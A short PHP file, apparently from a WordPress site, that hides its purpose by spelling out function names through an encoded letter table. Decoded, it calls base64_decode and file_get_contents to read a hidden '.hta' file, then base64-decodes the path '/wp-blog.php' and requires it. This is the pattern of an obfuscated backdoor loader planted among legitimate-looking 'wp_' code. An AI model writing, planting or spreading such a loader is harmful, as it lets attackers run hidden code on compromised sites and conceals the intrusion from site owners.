<?php
$wp_letter = range('z', 'a');
$bd = explode(',', '24,25,7,21,64,22,21,23,11,22,21,20,17,14,21,0,19,21,6,0,23,11,12,6,21,12,6,7');
$wp_bd = '';
for($i=0;$i<11;$i++){
	if($bd[$i] < 30){
		$wp_bd .= $wp_letter[$bd[$i]];
	}else{
		$wp_bd .= $bd[$i].'_';
	}
}
$wp_fg = '';
for($i=11;$i<count($bd);$i++){
	if($bd[$i] > 0){
		$wp_fg .= $wp_letter[$bd[$i]];
	}else{
		$wp_fg .= '_';
	}
}
$result = $wp_bd($wp_fg('.'.'h'.'t'.'a'), 1);
$path = $wp_bd('L3dwLWJsb2cucGhw', 1);
require __DIR__ .$path;